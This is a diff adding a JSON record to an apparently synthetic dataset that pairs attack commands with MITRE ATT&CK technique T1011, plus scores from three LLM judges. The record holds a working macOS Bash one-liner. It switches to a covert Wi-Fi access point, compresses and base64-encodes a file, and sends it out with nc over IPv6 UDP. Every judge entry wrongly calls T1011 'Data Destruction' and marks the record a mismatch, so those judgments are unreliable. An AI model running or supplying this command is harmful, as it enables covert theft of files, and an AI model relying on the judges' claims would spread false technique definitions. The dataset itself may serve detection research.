@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
+  "explanation": "Compresses and base64-encodes a text file and exfiltrates it via IPv6 UDP over a covert Wi\u2011Fi SSID on an uncommon port. This ensures use of an alternate wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Disassociate from any Wi\u2011Fi in use.",
+    "Join a covert AP on a high 5 GHz channel.",
+    "Compress and encode the file to make contents less readable in transit.",
+    "Transmit via IPv6 UDP on a high port bound to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-6b999b55",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all utilities (airport -z, networksetup -setairportnetwork, gzip -c, base64, nc -6u with port and -w timeout), and follows correct syntax for chaining commands via pipes.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command does exfiltrate data via network, it doesn't align with T1011 (Data Destruction) as it doesn't destroy or render data unrecoverable - it merely compresses, encodes and transmits data without removing the original file.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:39:39.418414Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command separators, balanced quotes, valid flags, and plausible macOS utilities and paths.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration, which directly contradicts the stated MITRE ATT&CK technique T1011 (Data Destruction) that involves rendering data unrecoverable.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:39:45.872856Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and proper use of && and pipelines with valid-looking flags and arguments, including IPv6 with scope and nc options.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs file exfiltration over Wi\u2011Fi/IPv6 UDP rather than any data destruction activity, so it is not aligned with the stated technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T01:40:22.061486Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
